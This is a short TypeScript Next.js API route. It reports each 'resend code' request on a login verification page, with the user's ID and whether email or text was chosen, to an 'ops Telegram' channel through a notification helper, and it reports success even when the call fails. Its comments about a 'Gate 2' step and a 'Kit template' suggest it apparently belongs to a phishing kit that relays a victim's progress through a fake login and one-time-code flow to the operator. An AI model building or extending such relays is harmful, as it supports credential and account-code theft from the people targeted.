import { NextRequest, NextResponse } from "next/server"

import { getClientIpFromRequest } from "@/lib/client-ip"
import { sendFormNotification } from "@/lib/telegram"

/**
 * Gate 2 "re-send code" event → ops Telegram.
 * Kit template: `sendFormNotification` type "login_email_otp_resend" / "login_text_otp_resend".
 */
export async function POST(request: NextRequest) {
  try {
    const data = (await request.json().catch(() => ({}))) as Record<
      string,
      unknown
    >;
    const method = data.method === "text" ? "text" : "email";

    await sendFormNotification({
      type:
        method === "email" ? "login_email_otp_resend" : "login_text_otp_resend",
      userId: String(data.userId ?? ""),
      page: "/verification/code",
      timestamp: new Date().toISOString(),
    });

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("Resend notify failed:", error);
    return NextResponse.json({ success: true });
  }
}
